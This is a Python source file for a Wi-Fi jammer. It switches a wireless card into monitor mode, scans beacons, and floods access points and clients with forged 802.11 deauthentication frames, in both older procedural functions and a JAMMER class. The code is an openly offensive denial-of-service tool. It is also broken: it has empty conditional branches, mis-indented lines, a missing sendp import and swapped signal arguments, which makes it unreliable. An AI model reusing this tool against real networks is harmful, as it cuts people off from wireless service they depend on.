#!/usr/bin/python
#Author: @hash3liZer

import sys
import argparse
import threading
import os
import time
import signal
import random
import subprocess
import re

from pull import PULL
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.eap   import EAPOL

def getNICnames():
	ifaces = []
	dev = open('/proc/net/dev', 'r')
	data = dev.read()
	for n in re.findall('[a-zA-Z0-9]+:', data):
		ifaces.append(n.rstrip(":"))
	return ifaces

def ifaceCard():
	global interface
	cards = []
	ifnames = getNICnames()
	for n in ifnames:
		if 'wlan' in n or 'mon' in n:
			cards.append(n)
	if len(cards) == 0:
		print "["+R+"!"+W+"] No Wireless Card Detected\n[*]Exiting in 3 Seconds"
		time.sleep(3)
		sys.exit()
	print "Write The Name of Desired Wireless Interface. Available are: "
	for p in cards:
		print p
	while True:
		ppt = raw_input("Enter The Name of Desired Wireless Interface: ")
		if ppt in cards:
			os.system('clear')
			break
	interface = ppt
	return

def monMode(iface):
	out__ = open(os.devnull, 'wb')
	if not confirmMon(iface):
		try:
			co = subprocess.call(['systemctl stop NetworkManager'], stdout=out__, stderr=out__)
			if co == 0:
				print "Killed"+" "+P+"Network Manager"					
		except:
			co = subprocess.call(['service', 'NetworkManager', 'stop'], stdout=out__, stderr=out__)
			if co == 0:
				print "Killed"+" "+P+"Network Manager"+W 
		os.system('ifconfig %s down' % iface)
		ab = os.system('iwconfig %s mode monitor' % iface)
		if ab != 0:
			os.system('ifconfig %s up' % iface)
			sys.exit(R+"Failed to Put Card in Monitor Mode")
		os.system('ifconfig %s up' % iface)
		print T+iface+W+" in monitor mode"
		out__.close()
		return True

def monModeOff(iface):
	out__ = open(os.devnull, 'wb')
	if confirmMon(iface):
		try:
			co = subprocess.call(['systemctl start NetworkManager'], stdout=out__, stderr=out__)					
		except:
			co = subprocess.call(['service', 'NetworkManager', 'start'], stdout=out__, stderr=out__)
		os.system('ifconfig %s down' % iface)
		if os.system('iwconfig %s mode managed' % iface) != 0 :
			os.system('ifconfig %s up' % iface)
			sys.exit(R+"Failed to Put Card in Managed Mode")
		os.system('ifconfig %s up' % iface)
		out__.close()
		return True

def confirmMon(iface):
	co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
	data = co.communicate()[0]
	card = re.findall('Mode:[A-Za-z]+', data)[0]	
	if "Monitor" in card:
		return True
	else:
		return False	

def aodStart(iface):
	null = open(os.devnull, 'wb')
	try:
		subprocess.Popen(['airodump-ng', iface], stdout=null, stderr=null)
	except KeyboardInterrupt:
		pass
	finally:
		null.close()

def collectDat(pkt):
	global list_, out_
	if pkt.haslayer(Dot11):
		if pkt.haslayer(Dot11Beacon) and pkt.getlayer(Dot11).addr2 not in list_:
			if pkt.getlayer(Dot11).addr2 in out_:
				print R+"Removed"+W+", BSSID: %s ESSID: %S" % (pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11Elt).info)	
			else: 
				list_.append(str(pkt.getlayer(Dot11).addr2))
				set(list_)
				if pkt.haslayer(Dot11Elt):
					ssid = pkt.getlayer(Dot11Elt).info
				else:
					ssid = "NO SSID"		
				print G+"Added"+W+", BSSID: %s ESSID: %s" % (pkt.getlayer(Dot11).addr2, str(ssid))
def sniffDat():
	global interface
	ch = 1
	null_ = open(os.devnull, 'wb')
	while True:
		try:
			subprocess.call(['iwconfig', interface, 'channel', str(ch)], stdout=null_, stderr=null_)
			if ch < 11:
				ch = ch+1
			else:
				ch = 1
			sniff(iface=interface, prn=collectDat, count=2)
		except Exception:
			pass
	null_.close()
	return

def deauthDev(tgt):
	global interface
	pckt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=tgt, addr3=tgt) / Dot11Deauth()
	while True:
		try:
			sendp(pckt, iface=interface, verbose=False)
		except Exception:
			break
	return
		

def deauthDev2(sc, dst):
	global interface
	norm = "FF:FF:FF:FF:FF:FF"
	pckt = RadioTap() / Dot11(addr1=dst, addr2=sc, addr3=sc) / Dot11Deauth()
	while True:
		try:
			sendp(pckt, iface=interface, verbose=False)
			if dst == norm or dst == "":
				print "Sent Deauth Packet to %s" % str(sc)
				time.sleep(0.5)
			else:
				print "Send Deauth Packet From %s to %s" % (str(sc), str(dst))
		except KeyboardInterrupt:
			break
		

def collectDev():
	global list_, run_list
	for tgt in list_:
		if tgt not in run_list:
			thread = threading.Thread(target=deauthDev, args=(tgt,), name="deauth")
			thread.daemon = True
			thread.start()
			run_list.append(tgt)
		else:
			pass

def apDeauth(sc,dst="FF:FF:FF:FF:FF:FF"):
	deauthDev2(sc, dst)

class JAMMER:

	__ACCESSPOINTS = set()

	def __init__(self, prs):
		self.interface = prs.interface
		self.channel   = prs.channel
		self.essids    = prs.essids
		self.aps       = prs.aps
		self.stations  = prs.stations
		self.filters   = prs.filters
		self.code      = prs.code
		self.delay     = prs.delay
		self.packets   = prs.packets
		self.verbose   = prs.verbose

	def extract_essid(self, layers):
		essid = ''
		counter = 1
		layer = layers.getlayer(Dot11Elt, counter)
		while layer:
			if hasattr(layer, "ID") and layer.ID == 0:
				essid = layer.info
				break
			else:
				counter += 1

		return essid

	def forge(self, sn, rc):
		pkt = RadioTap() / Dot11(
				addr1=rc,
				addr2=sn,
				addr3=sn
			) / Dot11Deauth(
				reason=self.code
			)

		return pkt

	def send(self, sender, receiver):
		pkts = (
			self.forge(sender, receiver),
			self.forge(receiver, sender)
		)

		for pkt in pkts:
			sendp(
				pkt,
				iface=self.interface,
				count=self.packets,
				verbose=False
			)
			pull.print("*",
				"Sent Deauths Count [{count}] Code [{Code}] {sender} -> {receiver} ".format(
					count=self.packets,
					code =self.code,
					sender=sender.upper(),
					receiver=sender.upper()
				),
				pull.YELLOW
			)

	def deauthenticate(self, sender, receiver):
		if self.aps and self.stations and self.filters:
			
		elif self.aps and self.stations and not self.filters:

		elif self.aps and not self.stations and self.filters:

		elif not self.aps and self.stations and self.filters:

		elif self.aps and not stations and not self.filters:

		elif not self.aps and not self.stations and self.filters:

		elif not self.aps and self.sations and not self.filters:

		else:
			self.send(sender, receiver)

	def injector(self, pkt):
		if pkt.haslayer(Dot11Beacon):
			macaddr = pkt.getlayer(Dot11).addr2
			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
			self.__ACCESSPOINTS.add(
					{
						'bssid': macaddr,
						'essid': essid
					}
				)
		elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == long(2) and not pkt.haslayer(EAPOL):
			sender   = pkt.getlayer(Dot11).addr2
			receiver = pkt.getlayer(Dot11).addr1

			self.deauthenticate(sender, receiver)

	def hopper(self, chs):
		if type(chs) == list:
			ch = random.choice(chs)
			while True:
				subprocess.call(['iwconfig', self.interface, 'channel', ch])
				time.sleep(0.5)

				lc = ch
				ch = random.choice(chs)
				while ch == lc:
					ch = random.choice(chs)
		else:
			subprocess.call(['iwconfig', self.interface, 'channel', chs])

	def engage(self):
		t = threading.Thread(target=self.hopper, args=(self.channel,))
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.injector)

class PARSER:

	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.channel   = self.channel(opts.channel)
		self.essids    = self.essids(opts.essids)
		self.aps       = self.aps(opts.aps)
		self.stations  = self.stations(opts.stations)
		self.filters   = self.filters(opts.filter)
		self.code      = opts.code if (opts.code >= 1 and opts.code <= 66) else pull.halt("Invalid Reason Code", True, pull.RED)
		self.delay     = opts.delay if opts.delay >= 0 else pull.halt("Invalid Delay Between Requests", True, pull.RED)
		self.packets   = opts.packets if opts.packets > 0 else pull.halt("Packets Must Be greater than 0", True, pull.RED)
		self.verbose   = opts.verbose
		self.signal    = signal.signal(self.handler, signal.SIGINT)

	def handler(self, sig, fr):
		pull.halt(
				"CTRL+C Received. Exiting", 
				True,
				"\r",
				pull.RED
			)

	def help(self, hl):
		if hl:
			pull.help()

	def channel(self, ch):
		chs = tuple(range(1,15))
		if ch:
			if ch in chs:
				return ch
			else:
				pull.halt("Not a Valid Channel. Choose in between 1-14.", True, pull.RED)
		else:
			return chs

	def essids(self, essids):
		retval = []
		if essids:
			essids = essids.split(",")
			for essid in essids:
				retval.append(essid)
		else:
			return []

	def aps(self, aps):
		retval = []
		if aps:
			aps = aps.split(",")
			for ap in aps:
				ap = ap.lower()
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ap):
					retval.append(ap)
				else:
					pull.halt("Not a Valid BSSID [%s]" % ap, True, pull.RED)
		else:
			return retval

	def stations(self, sts):
		retval = []
		if sts:
			sts = sts.split(",")
			for st in sts:
				st = st.lower()
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", st):
					retval.append(st)
				else:
					pull.halt("Not a Valid MAC Address [%s]" % st, True, pull.RED)
		else:
			return retval

	def filters(self, fts):
		retval = []
		if fts:
			fts = fts.split(",")
			for ft in fts:
				ft = ft.lower()
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ft):
					retval.append(ft)
				else:
					pull.halt("Not a Valid MAC Address [%s]" % ft, True, pull.RED)
		else:
			return retval

	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
			ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0]
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		ifaces = getNICnames()
		if iface in ifaces:
			if confirmMon(iface):
				return iface
			else:
				pull.halt("Interface Not in Monitor Mode [%s]" % iface, True, pull.RED) 
		else:
			pull.halt("No Such Interface [%s]" % iface, True, pull.RED)


def main():
	parser = argparse.ArgumentParser( add_help=False )

	parser.add_argument('-h', '--help', dest="help", default=False, action="store_true")
	parser.add_argument('-i', '--interface', dest="interface", default="", type=str)
	parser.add_argument('-c', '--channel'  , dest="channel"  , default=0 , type=int)
	parser.add_argument('-e', '-essids'    , dest="essids"   , default="", type=str)
	parser.add_argument('-a', '--access-points', dest="aps"  , default="", type=str)
	parser.add_argument('-s', '--stations' , dest="stations" , default="", type=str)
	parser.add_argument('-f', '--filters'  , dest="filters"  , default="", type=str)
	parser.add_argument('--code'           , dest="code"     , default=7 , type=int)
	parser.add_argument('--delay'          , dest="delay"    , default=0 , type=int)
	parser.add_argument('--packets'        , dest="packets"  , default=64, type=int)
	parser.add_argument('--verbose'        , dest="verbose"  , default=False, action="store_true")

	options = parser.parse_args()
	parser  = PARSER(options)

	pull.print(
		"*",
		"IFACE [{iface}] ESSIDS [{essids}] CH [{channel}]".format(
			iface=parser.interface,
			essids=len(parser.essids),
			channel=("Hop" if type(parser.channel) == list else parser.channel)
		),
		pull.YELLOW
	)
	pull.print(
		"*",
		"APS [{bssids}] STS [{sts}] CODE [{code}]".format(
			bssids=len(parser.aps),
			sts   =len(parser.stations),
			code  =parser.code,
		),
		pull.RED
	)
	pull.print(
		"*",
		"FILTERS [{filters}] STS [{delay}] CODE [{packets}]".format(
			filters=len(parser.filters),
			delay  =parser.delay,
			packets=parser.packets,
		),
		pull.GREEN
	)

	pull.print("^", "Engaging Now. Starting Jammer. ", pull.DARKCYAN)
	jammer = JAMMER(parser)
	jammer.engage()

if __name__ == "__main__":
	pull = PULL()
	main()
		
	
